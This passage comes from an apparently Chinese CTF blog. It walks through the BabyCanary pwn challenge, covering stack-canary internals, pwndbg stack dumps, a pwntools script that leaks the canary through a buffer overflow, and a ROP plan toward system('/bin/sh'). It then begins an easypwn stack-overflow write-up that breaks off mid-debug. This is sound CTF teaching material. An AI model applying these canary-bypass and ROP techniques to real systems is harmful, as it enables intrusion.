value)</span><br></pre></td></tr></table></figure><p>总的来说检测的机制是这样的：</p><p>1.程序从一个神奇的地方取出一个4（<strong>eax</strong>，32位系统）或8（<strong>rax</strong>，64位系统）节的值，在32位程序上，你可能会看到</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E4%BB%8EBabyCanary%E5%85%A5%E9%97%A8Canary/canary_1122569b3258873874d61fd5bfc62fba.png" alt></p><p>在64位上，你可能会看到</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E4%BB%8EBabyCanary%E5%85%A5%E9%97%A8Canary/canary_1d676e1ed18ade8675f112f61e39ab74.png" alt></p><p>放到栈上以后，<strong>eax</strong>中的副本也会被清空（<strong>xor eax,eax</strong>）</p><p>2.程序正常的走完了流程，到函数执行完的时候，程序会再次从那个神奇的地方把<strong>canary</strong>的值取出来，和之前放在栈上的<strong>canary</strong>进行比较，如果因为栈溢出什么的原因覆盖到了<strong>canary</strong>而导致<strong>canary</strong>发生了变化则直接终止程序</p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E4%BB%8EBabyCanary%E5%85%A5%E9%97%A8Canary/canary_1acfdb1810a2876c78383f4a3a66a515.png" alt></p><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E4%BB%8EBabyCanary%E5%85%A5%E9%97%A8Canary/canary_b151b13af2155fff6a842855cbbd4d07.png" alt></p><h2 id="BabyCanary"><a href="#BabyCanary" class="headerlink" title="BabyCanary"></a>BabyCanary</h2><p>我们先检查一下程序情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>可以得知开启了<strong>Canary</strong>防护和<strong>NX</strong>防护</p><p><strong>main</strong>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_4006F9();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sub_4006F9</strong>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_4006F9</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"tell me your name:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"OK,%s,let start!\n"</span>, &amp;buf);</span><br><span class="line">  sub_400696();</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sub_4006F9</strong>函数中使用<strong>read</strong>函数获取输入，然后使用<strong>printf</strong>函数直接输出，存在格式化字符串漏洞，可以泄露内存</p><p>大体思路就是通过格式化字符串读取<strong>canary</strong>的值，然后在栈溢出的<strong>padding</strong>块把<strong>canary</strong>所在位置的值用正确的<strong>canary</strong>替换，从而绕过<strong>canary</strong>的检测</p><p>观察得到Canary的生成代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004006F</span>9                 push    rbp</span><br><span class="line">.text:<span class="number">00000000004006F</span>A                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">00000000004006F</span>D                 sub     rsp, <span class="number">90</span>h</span><br><span class="line">.text:<span class="number">0000000000400704</span> ; <span class="number">5</span>:   v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">.text:<span class="number">0000000000400704</span>                 mov     rax, fs:<span class="number">28</span>h</span><br><span class="line">.text:<span class="number">000000000040070</span>D                 mov     [rbp+var_8], rax</span><br><span class="line">.text:<span class="number">0000000000400711</span> ; <span class="number">6</span>:   <span class="built_in">puts</span>(<span class="string">"tell me your name:"</span>);</span><br><span class="line">.text:<span class="number">0000000000400711</span>                 xor     eax, eax</span><br></pre></td></tr></table></figure><p>我们使用<strong>GDB</strong>调试，先下一个断点到<strong>0x00000000004006F9</strong>，查看一下汇编情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">► 0x4006f9    push   rbp</span><br><span class="line">  0x4006fa    mov    rbp, rsp</span><br><span class="line">  0x4006fd    sub    rsp, 0x90</span><br><span class="line">  0x400704    mov    rax, qword ptr fs:[0x28]</span><br><span class="line">  0x40070d    mov    qword ptr [rbp - 8], rax</span><br><span class="line">  0x400711    xor    eax, eax</span><br><span class="line">  0x400713    mov    edi, 0x400824</span><br><span class="line">  0x400718    call   0x400560</span><br><span class="line">  0x40071d    lea    rax, [rbp - 0x90]</span><br><span class="line">  0x400724    mov    edx, 0x100</span><br><span class="line">  0x400729    mov    rsi, rax</span><br></pre></td></tr></table></figure><p>一直单步运行直至异或eax寄存器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  0x4006f9    push   rbp</span><br><span class="line">  0x4006fa    mov    rbp, rsp</span><br><span class="line">  0x4006fd    sub    rsp, 0x90</span><br><span class="line">  0x400704    mov    rax, qword ptr fs:[0x28]</span><br><span class="line">  0x40070d    mov    qword ptr [rbp - 8], rax</span><br><span class="line">► 0x400711    xor    eax, eax</span><br><span class="line">  0x400713    mov    edi, 0x400824</span><br><span class="line">  0x400718    call   0x400560</span><br><span class="line">  0x40071d    lea    rax, [rbp - 0x90]</span><br><span class="line">  0x400724    mov    edx, 0x100</span><br><span class="line">  0x400729    mov    rsi, rax</span><br></pre></td></tr></table></figure><p>查看此时栈上的情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx $rbp</span><br><span class="line">0x7fffffffde40:0x00007fffffffde500x000000000040077e</span><br><span class="line">0x7fffffffde50:0x00000000004007900x00007ffff7a2d830</span><br><span class="line">0x7fffffffde60:0x00007fffffffdf380x00007fffffffdf38</span><br><span class="line">0x7fffffffde70:0x00000001f7b996080x0000000000400770</span><br><span class="line">0x7fffffffde80:0x00000000000000000x5dbdf3d3bbac9a43</span><br><span class="line">0x7fffffffde90:0x00000000004005a00x00007fffffffdf30</span><br><span class="line">0x7fffffffdea0:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffdeb0:0xa2420cac084c9a430xa2421c161b5c9a43</span><br><span class="line">0x7fffffffdec0:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fffffffded0:0x00000000000000000x00007fffffffdf48</span><br></pre></td></tr></table></figure><p>得知canary的值在<code>[rbp - 8]</code>处，则我们直接查看这里的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope $rbp-8</span><br><span class="line">00:0000│      0x7fffffffde38 ◂— 0xca64b11c5d706100</span><br><span class="line">01:0008│ rbp  0x7fffffffde40 —▸ 0x7fffffffde50 —▸ 0x400790 ◂— push   r15</span><br><span class="line">02:0010│      0x7fffffffde48 —▸ 0x40077e ◂— mov    eax, 0</span><br><span class="line">03:0018│      0x7fffffffde50 —▸ 0x400790 ◂— push   r15</span><br><span class="line">04:0020│      0x7fffffffde58 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">05:0028│      0x7fffffffde60 —▸ 0x7fffffffdf38 —▸ 0x7fffffffe2a9 ◂— &apos;/home/syc/Documents/challange/babycanary/babycanary&apos;</span><br><span class="line">... ↓</span><br><span class="line">07:0038│      0x7fffffffde70 ◂— 0x1f7b99608</span><br></pre></td></tr></table></figure><p>可以得知<strong>Canary</strong>的值就是 <strong>0xca64b11c5d706100</strong></p><p>但是问题是我们发现这题其实并不能使用格式化字符串实现泄露<strong>Canary</strong>的地址，因为它使用的是<strong>Read</strong>函数，并不会在后面添加<strong>“0/”</strong>截断，无法被解析也就无法利用格式化字符串漏洞。我们只能使用栈溢出直接输出<strong>Canary</strong>函数</p><p>我们先构造一个长度为<strong>90</strong>的字符串先尝试一下，下一个断点在<strong>0x0000000000400736</strong>(<strong>printf</strong>函数)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Documents/challange$ python pattern.py create 128</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae</span><br></pre></td></tr></table></figure><p>然后运行在断点处查看栈结构</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> stack 50</span><br><span class="line">00:0000│ rsi rsp  0x7fffffffddb0 ◂— 0x6141316141306141 ('Aa0Aa1Aa')</span><br><span class="line">01:0008│          0x7fffffffddb8 ◂— 0x4134614133614132 ('2Aa3Aa4A')</span><br><span class="line">02:0010│          0x7fffffffddc0 ◂— 0x3761413661413561 ('a5Aa6Aa7')</span><br><span class="line">03:0018│          0x7fffffffddc8 ◂— 0x6241396141386141 ('Aa8Aa9Ab')</span><br><span class="line">04:0020│          0x7fffffffddd0 ◂— 0x4132624131624130 ('0Ab1Ab2A')</span><br><span class="line">05:0028│          0x7fffffffddd8 ◂— 0x3562413462413362 ('b3Ab4Ab5')</span><br><span class="line">06:0030│          0x7fffffffdde0 ◂— 0x6241376241366241 ('Ab6Ab7Ab')</span><br><span class="line">07:0038│          0x7fffffffdde8 ◂— 0x4130634139624138 ('8Ab9Ac0A')</span><br><span class="line">08:0040│          0x7fffffffddf0 ◂— 0x3363413263413163 ('c1Ac2Ac3')</span><br><span class="line">09:0048│          0x7fffffffddf8 ◂— 0x6341356341346341 ('Ac4Ac5Ac')</span><br><span class="line">0a:0050│          0x7fffffffde00 ◂— 0x4138634137634136 ('6Ac7Ac8A')</span><br><span class="line">0b:0058│          0x7fffffffde08 ◂— 0x3164413064413963 ('c9Ad0Ad1')</span><br><span class="line">0c:0060│          0x7fffffffde10 ◂— 0x6441336441326441 ('Ad2Ad3Ad')</span><br><span class="line">0d:0068│          0x7fffffffde18 ◂— 0x4136644135644134 ('4Ad5Ad6A')</span><br><span class="line">0e:0070│          0x7fffffffde20 ◂— 0x3964413864413764 ('d7Ad8Ad9')</span><br><span class="line">0f:0078│          0x7fffffffde28 ◂— 0x6541316541306541 ('Ae0Ae1Ae')</span><br><span class="line">10:0080│          0x7fffffffde30 —▸ 0x40070a ◂— add    byte ptr [rax], al</span><br><span class="line">11:0088│          0x7fffffffde38 ◂— 0x8b5843fb32c04100</span><br><span class="line">12:0090│ rbp      0x7fffffffde40 —▸ 0x7fffffffde50 —▸ 0x400790 ◂— push   r15</span><br><span class="line">13:0098│          0x7fffffffde48 —▸ 0x40077e ◂— mov    eax, 0</span><br><span class="line">14:00a0│          0x7fffffffde50 —▸ 0x400790 ◂— push   r15</span><br><span class="line">15:00a8│          0x7fffffffde58 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">16:00b0│          0x7fffffffde60 —▸ 0x7fffffffdf38 —▸ 0x7fffffffe2a9 ◂— '/home/syc/Documents/challange/babycanary/babycanary'</span><br><span class="line">... ↓</span><br><span class="line">18:00c0│          0x7fffffffde70 ◂— 0x1f7b99608</span><br><span class="line">19:00c8│          0x7fffffffde78 —▸ 0x400770 ◂— push   rbp</span><br><span class="line">1a:00d0│          0x7fffffffde80 ◂— 0x0</span><br><span class="line">1b:00d8│          0x7fffffffde88 ◂— 0x4b03463a62f1fbbf</span><br><span class="line">1c:00e0│          0x7fffffffde90 —▸ 0x4005a0 ◂— xor    ebp, ebp</span><br><span class="line">1d:00e8│          0x7fffffffde98 —▸ 0x7fffffffdf30 ◂— 0x1</span><br><span class="line">1e:00f0│          0x7fffffffdea0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">20:0100│          0x7fffffffdeb0 ◂— 0xb4fcb945d111fbbf</span><br><span class="line">21:0108│          0x7fffffffdeb8 ◂— 0xb4fca9ffc201fbbf</span><br><span class="line">22:0110│          0x7fffffffdec0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">25:0128│          0x7fffffffded8 —▸ 0x7fffffffdf48 —▸ 0x7fffffffe2dd ◂— 'XDG_VTNR=7'</span><br><span class="line">26:0130│          0x7fffffffdee0 —▸ 0x7ffff7ffe168 ◂— 0x0</span><br><span class="line">27:0138│          0x7fffffffdee8 —▸ 0x7ffff7de77db (_dl_init+139) ◂— jmp    0x7ffff7de77b0</span><br><span class="line">28:0140│          0x7fffffffdef0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">2a:0150│          0x7fffffffdf00 —▸ 0x4005a0 ◂— xor    ebp, ebp</span><br><span class="line">2b:0158│          0x7fffffffdf08 —▸ 0x7fffffffdf30 ◂— 0x1</span><br><span class="line">2c:0160│          0x7fffffffdf10 ◂— 0x0</span><br><span class="line">2d:0168│          0x7fffffffdf18 —▸ 0x4005c9 ◂— hlt    </span><br><span class="line">2e:0170│          0x7fffffffdf20 —▸ 0x7fffffffdf28 ◂— 0x1c</span><br><span class="line">2f:0178│          0x7fffffffdf28 ◂— 0x1c</span><br><span class="line">30:0180│ r13      0x7fffffffdf30 ◂— 0x1</span><br><span class="line">31:0188│          0x7fffffffdf38 —▸ 0x7fffffffe2a9 ◂—</span><br></pre></td></tr></table></figure><p>从<code>11:0088│          0x7fffffffde38 ◂— 0x8b5843fb32c04100</code>可以知道这就是<strong>Canary</strong>的值，那我们还需要增加字符串长度，正好溢出到canary的位置，则根据计算<strong>hex(30-28=8)</strong>,则需要生成<strong>136</strong>个字符</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Documents/challange$ python pattern.py create 136</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4A</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> stack 50</span><br><span class="line">00:0000│ rax rsi rsp  0x7fffffffddb0 ◂— 0x6141316141306141 ('Aa0Aa1Aa')</span><br><span class="line">01:0008│              0x7fffffffddb8 ◂— 0x4134614133614132 ('2Aa3Aa4A')</span><br><span class="line">02:0010│              0x7fffffffddc0 ◂— 0x3761413661413561 ('a5Aa6Aa7')</span><br><span class="line">03:0018│              0x7fffffffddc8 ◂— 0x6241396141386141 ('Aa8Aa9Ab')</span><br><span class="line">04:0020│              0x7fffffffddd0 ◂— 0x4132624131624130 ('0Ab1Ab2A')</span><br><span class="line">05:0028│              0x7fffffffddd8 ◂— 0x3562413462413362 ('b3Ab4Ab5')</span><br><span class="line">06:0030│              0x7fffffffdde0 ◂— 0x6241376241366241 ('Ab6Ab7Ab')</span><br><span class="line">07:0038│              0x7fffffffdde8 ◂— 0x4130634139624138 ('8Ab9Ac0A')</span><br><span class="line">08:0040│              0x7fffffffddf0 ◂— 0x3363413263413163 ('c1Ac2Ac3')</span><br><span class="line">09:0048│              0x7fffffffddf8 ◂— 0x6341356341346341 ('Ac4Ac5Ac')</span><br><span class="line">0a:0050│              0x7fffffffde00 ◂— 0x4138634137634136 ('6Ac7Ac8A')</span><br><span class="line">0b:0058│              0x7fffffffde08 ◂— 0x3164413064413963 ('c9Ad0Ad1')</span><br><span class="line">0c:0060│              0x7fffffffde10 ◂— 0x6441336441326441 ('Ad2Ad3Ad')</span><br><span class="line">0d:0068│              0x7fffffffde18 ◂— 0x4136644135644134 ('4Ad5Ad6A')</span><br><span class="line">0e:0070│              0x7fffffffde20 ◂— 0x3964413864413764 ('d7Ad8Ad9')</span><br><span class="line">0f:0078│              0x7fffffffde28 ◂— 0x6541316541306541 ('Ae0Ae1Ae')</span><br><span class="line">10:0080│              0x7fffffffde30 ◂— 0x4134654133654132 ('2Ae3Ae4A')</span><br><span class="line">11:0088│              0x7fffffffde38 ◂— 0xfb83dc38787b3d0a</span><br><span class="line">12:0090│ rbp          0x7fffffffde40 —▸ 0x7fffffffde50 —▸ 0x400790 ◂— push   r15</span><br></pre></td></tr></table></figure><p>可以看到Canary的值就是<strong>0xfb83dc38787b3d0a</strong></p><p>这样子我们可以写一个脚本来暴露Canary的值了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">"./babycanary"</span>)</span><br><span class="line">gdb.attach(r,<span class="string">"b *0x400736"</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">136</span></span><br><span class="line">r.sendlineafter(<span class="string">"tell me your name:\n"</span>,payload)</span><br><span class="line">r.recvuntil(<span class="string">'OK,'</span>+ <span class="string">"a"</span>*<span class="number">136</span>)</span><br><span class="line">canary = u64(r.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"canary :"</span> + hex(canary)</span><br></pre></td></tr></table></figure><p>运行后可以得到Canary的值为：<strong>0xbc2b48de6267a90a</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0xa5 bytes:</span><br><span class="line">    00000000  4f 4b 2c 61  61 61 61 61  61 61 61 61  61 61 61 61  │OK,a│aaaa│aaaa│aaaa│</span><br><span class="line">    00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    00000080  61 61 61 61  61 61 61 61  61 61 61 0a  a9 67 62 de  │aaaa│aaaa│aaa·│·gb·│</span><br><span class="line">    00000090  48 2b bc 70  cc 8b ca ff  7f 2c 6c 65  74 20 73 74  │H+·p│····│·,le│t st│</span><br><span class="line">    000000a0  61 72 74 21  0a                                     │art!│·│</span><br><span class="line">    000000a5</span><br><span class="line">canary :0xbc2b48de6267a90a</span><br></pre></td></tr></table></figure><p>通过GDB调试可以查看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> stack 50</span><br><span class="line">00:0000│ rax rsi rsp  0x7fffca8bcbd0 ◂— 0x6161616161616161 ('aaaaaaaa')</span><br><span class="line">... ↓</span><br><span class="line">11:0088│              0x7fffca8bcc58 ◂— 0xbc2b48de6267a90a</span><br><span class="line">12:0090│ rbp          0x7fffca8bcc60 —▸ 0x7fffca8bcc70 —▸ 0x400790 ◂— push   r15</span><br><span class="line">13:0098│              0x7fffca8bcc68 —▸ 0x40077e ◂— mov    eax, 0</span><br><span class="line">14:00a0│              0x7fffca8bcc70 —▸ 0x400790 ◂— push   r15</span><br><span class="line">15:00a8│              0x7fffca8bcc78 —▸ 0x7fd06a5f1830 (__libc_start_main+240)</span><br></pre></td></tr></table></figure><p>我们的脚本是正确的，我们已经获取了绕过Canary，接下来就是普通的栈溢出题目了</p><p>可以覆盖返回地址为<strong>pop pop pop pop ret</strong>指令地址，返回时弹出<strong>0x18</strong>个填充字节和返回地址,返回到<strong>buf+0x20</strong>处，就避开了栈不可执行</p><p>在<strong>buf+0x20</strong>处构造<strong>ROP</strong>，通过write函数，先泄露<strong>libc</strong>基地址，返回到<strong>start</strong></p><p>重新执行，输入使之执行<strong>system(‘/bin/sh’)</strong></p><p>需要用到的信息，包括<strong>bss</strong>段的地址、<strong>main</strong>函数地址、程序中已有函数的地址、<strong>gadgets</strong>地址</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>黑盾杯-2019-PWN-easypwn</title>
      <link href="/2019/09/18/%E2%95%91%E2%94%8C%E2%95%A2%E2%96%84%E2%96%92%C2%A1-2019-PWN-easypwn/"/>
      <url>/2019/09/18/%E2%95%91%E2%94%8C%E2%95%A2%E2%96%84%E2%96%92%C2%A1-2019-PWN-easypwn/</url>
      
        <content type="html"><![CDATA[<p>首先检查一下程序保护措施</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>可以发现程序开启了<strong>NX</strong>保护即栈不可执行保护，我们再开启<strong>IDA Pro</strong>进行反汇编</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-400h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Welcome to CTF\n"</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  sub_4006C6(&amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们查看<strong>sub_4006C6</strong>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_4006C6</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;dest, a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"%s"</span>, &amp;dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以发现到一个显著的栈溢出漏洞，可以看见read函数读取了长度为<strong>0x400(1024)</strong>的字符，然而<strong>sub_4006C6</strong>函数里面的可以看到栈桢的大小是<strong>10h</strong></p><p>由于<strong>sub_4006C6</strong>函数的栈桢大小<strong>10h</strong>远小于<strong>read</strong>函数可以读取的数据长度<strong>400h</strong>，在进行循环赋值的时候，<strong>sub_4006C6</strong>函数保存在栈中的返回地址会被覆盖</p><p>我们进行动态调式验证一下我们的判断</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> b *0x00000000004006F6</span><br><span class="line">Breakpoint 1 at 0x4006f6</span><br><span class="line"><span class="meta">pwndbg&gt;</span> r</span><br><span class="line">Starting program: /mnt/hgfs/share/easypwn/easypwn </span><br><span class="line">Welcome to CTF</span><br><span class="line">aaaaaaaaaaaaaaaa</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00000000004006f6 in ?? ()</span><br></pre></td></tr></table></figure><p>我们查看一下栈上的情况</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span> stack 50</span><br><span class="line">00:0000│ rsp      0x7fffffffda60 —▸ 0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad208b</span><br><span class="line">01:0008│          0x7fffffffda68 —▸ 0x7fffffffda90 ◂— 0x6161616161616161 ('aaaaaaaa')</span><br><span class="line">02:0010│ rsi      0x7fffffffda70 ◂— 0x6161616161616161 ('aaaaaaaa')</span><br><span class="line">... ↓</span><br><span class="line">04:0020│ rdx rbp  0x7fffffffda80 —▸ 0x7fffffffda0a ◂— 